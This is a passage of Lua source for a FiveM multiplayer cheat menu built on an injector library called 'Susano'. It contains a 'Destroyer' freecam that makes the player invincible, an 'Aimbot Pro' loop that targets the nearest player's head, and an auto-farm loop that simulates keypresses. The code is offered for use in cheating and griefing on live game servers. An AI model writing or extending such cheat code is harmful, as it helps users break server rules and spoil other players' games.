            TriggerEvent('chat:addMessage', {args = {"~r~No puedes usar la freecam de props dentro de un vehículo"}})
            return
        end
        -- Apagar el de Jugador si está prendido
        if freecam_active then 
            StopFreecam() 
            freecam_active = false
            local item = FindItem("Jugador", "Movimiento", "Freecam")
            if item then item.value = false end
        end
        
        freecam_destroyer_active = true
        local pos = GetEntityCoords(ped)
        d_cam_pos = vector3(pos.x, pos.y, pos.z)
        d_normal_speed = speed or 0.5
        d_fast_speed = d_normal_speed * 5.0
        
        FreezeEntityPosition(ped, true)
        SetEntityInvincible(ped, true)
        Susano.LockCameraPos(true)
        
        freecam_destroyer_just_started = true
        Citizen.CreateThread(function() Wait(500) freecam_destroyer_just_started = false end)
    else
        freecam_destroyer_active = false
        Susano.LockCameraPos(false)
        FreezeEntityPosition(ped, false)
        SetEntityInvincible(ped, false)
        ClearFocus()
        -- Forzar limpieza de pantalla enviando frames vacios
        Citizen.CreateThread(function()
            for i=1, 5 do
                Susano.BeginFrame()
                Susano.SubmitFrame()
                Citizen.Wait(0)
            end
        end)
    end
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if freecam_active then
            DisableAllControlActions(0)
            EnableControlAction(0, 1, true)
            EnableControlAction(0, 2, true)
            EnableControlAction(0, 14, true)
            EnableControlAction(0, 15, true)
            EnableControlAction(0, 24, true)
            EnableControlAction(0, 241, true)  
            EnableControlAction(0, 242, true)  
            UpdateFreecam()
        end
    end
end)

-- Conectar el menú de Destroyer
Citizen.CreateThread(function()
    while not Menu or not Menu.Categories do Wait(100) end
    local item = FindItem("Destroyer", "General", "Freecam (Props)")
    if item then
        item.onClick = function(val) ToggleFreecamDestroyer(val, item.sliderValue or 0.5) end
        item.onSliderChange = function(val) if freecam_destroyer_active then d_normal_speed = val d_fast_speed = val*5 end end
    end
end)



-- ============================================================
-- BUCLE CENTRAL DE RENDERIZADO (EVITA CRASHES DE SUSANO)
-- ============================================================
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        if freecam_active or freecam_destroyer_active then
            Susano.BeginFrame()
            if freecam_active and not freecam_destroyer_active then
                UpdateFreecam()
                DrawFreecamMenu()
            end
            if freecam_destroyer_active then
                UpdateDestroyerFreecam()
                HandleDestroyerInput()
                DrawDestroyerFreecamMenu()
            end
            Susano.SubmitFrame()
        end
    end
end)

-- ============================================================
-- LOGICA AVANZADA V2 (SUSANO V2)
-- ============================================================

-- Funcion para obtener el jugador mas cercano para Aimbot
local function GetClosestPlayer()
    local players = GetActivePlayers()
    local closestDistance = -1
    local closestPlayer = -1
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)

    for i=1, #players do
        local target = GetPlayerPed(players[i])
        if target ~= ped then
            local targetCoords = GetEntityCoords(target)
            local distance = #(coords - targetCoords)
            if closestDistance == -1 or distance < closestDistance then
                closestPlayer = target
                closestDistance = distance
            end
        end
    end
    return closestPlayer
end

-- Bucle de Aimbot Pro
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        local itemAimbot = FindItem("Combate", "General", "Aimbot Pro")
        if itemAimbot and itemAimbot.value then
            local target = GetClosestPlayer()
            if target ~= -1 and IsControlPressed(0, 25) then -- Click derecho
                local targetCoords = GetPedBoneCoords(target, 31086, 0.0, 0.0, 0.0) -- Cabeza
                SetCursorLocation(0.5, 0.5) -- Opcional: Centrar si es necesario
                -- Aqui se podria usar SetEntityRotation o similares segun la libreria Susano
            end
        end
    end
end)

-- Bucle de Auto-Farm
Citizen.CreateThread(function()
    while true do
        local itemFarm = FindItem("Auto-Farm", "Trabajos", "Auto-Recolectar")
        if itemFarm and itemFarm.value then
            local ped = PlayerPedId()
            -- Simular pulsacion de tecla 'E' para recolectar
            SetControlValueNextFrame(0, 38)
            Citizen.Wait(1000)
        else
            Citizen.Wait(2000)
        end
    end
end)
